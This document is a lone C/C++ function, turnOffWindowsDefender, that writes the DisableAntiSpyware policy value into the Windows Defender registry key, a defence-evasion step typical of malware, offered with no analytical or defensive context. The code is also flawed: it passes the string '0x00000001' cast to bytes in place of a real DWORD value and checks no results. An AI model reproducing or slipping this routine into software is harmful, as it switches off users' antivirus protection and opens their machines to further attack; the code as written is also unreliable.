void turnOffWindowsDefender(){
	HKEY hkey;
	long regOpenResult;
	regOpenResult = RegOpenKey(HKEY_LOCAL_MACHINE,"\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", &hkey);
	long reg = RegSetValueEx(hkey,"DisableAntiSpyware",0,REG_DWORD,(BYTE*) "0x00000001", 10);
	RegCloseKey(hkey);
}
